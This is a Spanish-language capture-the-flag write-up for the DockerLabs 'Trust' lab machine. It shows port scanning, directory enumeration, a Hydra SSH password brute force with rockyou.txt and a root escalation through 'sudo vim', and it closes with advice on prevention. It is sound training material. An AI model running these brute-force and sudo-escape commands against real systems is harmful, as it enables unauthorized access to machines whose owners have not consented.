# 🎯 Trust - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-Enumeraci%C3%B3n%20web%20%7C%20Hydra%20%7C%20GTFObins-orange)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota:

- **Enumeración web** con Gobuster para descubrir un archivo oculto (`secret.php`).
- **Fuerza bruta SSH** con Hydra y `rockyou.txt`.
- **Escalada de privilegios** abusando de `sudo vim` (GTFObins).

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | 22 (SSH), 80 (HTTP) |
| Enumeración web | `gobuster` con `--exclude-length` | `secret.php` |
| Descubrimiento | `curl secret.php` | Usuario `mario` |
| Fuerza bruta | `hydra` + `rockyou.txt` | `mario:chocolate` |
| Acceso SSH | `ssh` | Shell como `mario` |
| Escalada | `sudo vim -c ':!/bin/bash'` | **root** ✅ |

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio |
|--------|----------|
| 22     | SSH      |
| 80     | HTTP     |

### Fingerprinting web

```bash
curl -I http://172.17.0.2
```

**Resultado:** Apache en Debian. La web es la página por defecto ("It works!").

---

## 🔎 Enumeración

### 1. Enumeración de directorios

El primer intento con Gobuster falla por un **falso positivo**: Apache devuelve 200 OK con la misma página (10701 bytes) para **cualquier** ruta inexistente.

**Solución:** excluir las respuestas con ese tamaño.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt --exclude-length 10701
```

**Resultado:** `/secret.php`

### 2. Descubrimiento del usuario

```bash
curl http://172.17.0.2/secret.php
```

**Contenido:**

```
Hola mario, esta página no se puede hackear.
```

💡 **Hallazgo:** el usuario real es **`mario`**.

---

## 💥 Explotación

### 3. Fuerza bruta SSH

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

**Credenciales obtenidas:**

```
mario:chocolate
```

### 4. Acceso SSH

```bash
ssh mario@172.17.0.2
# password: chocolate
```

> ⚠️ Si aparece `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`:
> ```bash
> ssh-keygen -R 172.17.0.2
> ```

---

## 🚀 Escalada de privilegios

### 5. Enumeración de sudo

```bash
sudo -l
```

**Salida:**

```
User mario may run the following commands on c4d34c936eb7:
    (ALL) /usr/bin/vim
```

`mario` puede ejecutar **`vim` como root**.

### 6. Exploit con GTFObins

Consultando [GTFObins - vim](https://gtfobins.github.io/gtfobins/vim/):

```bash
sudo vim -c ':!/bin/bash'
```

Comprobación:

```bash
whoami
# root
```

✅ **Máquina comprometida completamente.**

---

## 📸 Evidencia

<img width="313" height="39" alt="image" src="https://github.com/user-attachments/assets/698dc616-5ef6-4082-a9ac-027deca5a045" />


---

## 🏁 Flags

Esta máquina **no incluye archivo de flag**. La evidencia es:

```bash
whoami
# root
```

---

## 🧠 Lecciones aprendidas

1. **Gobuster puede dar falsos positivos** cuando el servidor devuelve 200 OK para rutas inexistentes. Solución: `--exclude-length` con el tamaño de la página por defecto.
2. **La web "inútil" puede esconder pistas.** La página por defecto de Apache ocultaba `secret.php`.
3. **Los mensajes de la web son pistas.** "Hola mario" → el usuario es `mario`.
4. **`hydra` con `rockyou.txt`** encuentra contraseñas como `chocolate` rápidamente.
5. **`sudo -l` es lo primero** tras obtener shell.
6. **`vim` con sudo es un GTFObins clásico**: `sudo vim -c ':!/bin/bash'`.
7. **Verificar el nombre del contenedor** con `docker ps` cuando algo no cuadra.

---

## 🛡️ ¿Cómo se previene?

1. **No usar `sudo` con binarios que permitan escapar** (vim, nano, less, more...).
2. **Configurar `sudoers` con comandos específicos**, no binarios genéricos.
3. **Eliminar archivos y páginas por defecto** del servidor web.
4. **No usar contraseñas débiles** (`chocolate` está en `rockyou.txt`).
5. **Deshabilitar login de root por SSH** y usar autenticación por clave.
6. **Configurar Apache para devolver 404** en rutas inexistentes (evita falsos positivos).

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `gobuster`
- `curl`
- `hydra`
- SSH
- GTFObins

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [GTFObins - vim](https://gtfobins.github.io/gtfobins/vim/)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Gobuster](https://github.com/OJ/gobuster)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-10
